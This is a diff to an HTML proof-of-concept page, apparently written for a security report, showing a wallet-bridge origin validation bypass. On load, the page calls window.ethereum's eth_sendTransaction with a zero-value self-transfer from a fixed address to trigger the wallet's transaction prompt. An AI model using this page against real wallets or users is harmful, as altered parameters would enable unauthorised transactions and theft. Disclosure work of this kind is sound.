@@ -1,32 +1,41 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Security PoC: Bridge Origin Validation Bypass</title>
+</head>
 <body>
-    <h2>Security Verification: Triggering Transaction UI</h2>
+    <h1>Security Audit: Bridge Access</h1>
+    <div id="status">Testing bridge availability...</div>
+
     <script>
-        const bridge = window.ethereum;
+        async function runExploit() {
+            const bridge = window.ethereum; // Namespace utama untuk DApp
+            const status = document.getElementById('status');
 
-        async function triggerValidTx() {
-            try {
-                // Gunakan parameter yang sangat standar
-                // Jangan gunakan data '0x...' yang kompleks untuk menghindari error kontrak
-                const txParams = {
-                    from: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
-                    to: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE', 
-                    value: '0x00', // Nilai nol
-                    // Hapus parameter 'data' agar dompet tidak mencoba memanggil fungsi kontrak yang salah
-                };
-
-                const result = await bridge.request({
-                    method: 'eth_sendTransaction',
-                    params: [txParams]
-                });
-                console.log("Transaksi Diterima:", result);
-            } catch (e) {
-                console.log("Triggered - UI muncul, namun transaksi dihentikan:", e);
+            if (bridge) {
+                status.innerHTML = "Bridge found. Attempting to trigger transaction...";
+                
+                try {
+                    // Payload standar untuk membuktikan trigger terjadi tanpa otorisasi domain
+                    await bridge.request({
+                        method: 'eth_sendTransaction',
+                        params: [{
+                            from: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
+                            to: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
+                            value: '0x00',
+                            data: '0x'
+                        }]
+                    });
+                    status.innerHTML = "Transaction UI triggered.";
+                } catch (err) {
+                    status.innerHTML = "UI triggered but rejected by user/system: " + err.message;
+                }
+            } else {
+                status.innerHTML = "No bridge detected.";
             }
         }
 
-        window.onload = triggerValidTx;
+        window.onload = runExploit;
     </script>
 </body>
 </html>
